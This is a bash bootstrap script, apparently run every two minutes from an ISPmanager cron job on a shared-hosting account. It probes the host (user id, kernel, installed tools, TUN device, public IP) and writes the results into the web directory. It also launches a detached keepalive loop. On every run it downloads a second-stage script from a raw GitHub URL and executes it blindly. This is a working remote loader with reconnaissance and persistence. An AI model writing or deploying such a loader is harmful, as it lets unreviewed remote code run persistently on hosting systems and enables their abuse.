#!/bin/bash
# yacolo bootstrap — runs every 2 min from ISPmanager cron as the site user
set -u
H="${HOME:-/var/www/yacolo356805/data}"
RAW="https://raw.githubusercontent.com/btpp03/pofa/refs/heads/main/xiaogangpao"
mkdir -p "$H/log" "$H/run" "$H/www" "$H/bin" 2>/dev/null

# throttle: cron still fires every 2 min, but real work runs at most once per ~10 min
STAMP="$H/run/last_tick"
now=$(date +%s)
last=$(cat "$STAMP" 2>/dev/null || echo 0)
case "$last" in ''|*[!0-9]*) last=0 ;; esac
if [ $((now - last)) -lt 540 ]; then exit 0; fi
echo "$now" > "$STAMP" 2>/dev/null

# one-time environment probe
if [ ! -f "$H/run/probed" ]; then
  {
  echo "=== yacolo bootstrap run: $(date -u '+%F %T') UTC ==="
  echo "host: $(hostname 2>/dev/null) | id: $(id 2>/dev/null)"
  echo "HOME: $H | kernel: $(uname -sr)"
  echo "--- binaries ---"
  for b in bash curl wget php git tar unzip setsid nohup crontab ssh; do
    printf '%s=%s ' "$b" "$(command -v "$b" 2>/dev/null || echo NO)"
  done
  echo
  echo "--- tun ---"; ls -l /dev/net/tun 2>&1
  echo "--- egress ---"; curl -s --max-time 10 https://api.ipify.org; echo
  } > "$H/www/probe.out" 2>&1
  touch "$H/run/probed"
fi

# single watchdog loop (60s ticks)
if ! pgrep -u "$(id -u)" -f 'alive.log' >/dev/null 2>&1; then
  setsid nohup bash -c "while :; do echo \"\$(date -u +%FT%TZ) alive\" >> '$H/log/alive.log'; sleep 60; done" >/dev/null 2>&1 &
fi

# stage2 = deploy/keepalive logic, refreshed from GitHub every run
if curl -fsSL --max-time 25 "$RAW/stage2.sh" -o "$H/run/stage2.sh"; then
  bash "$H/run/stage2.sh"
fi
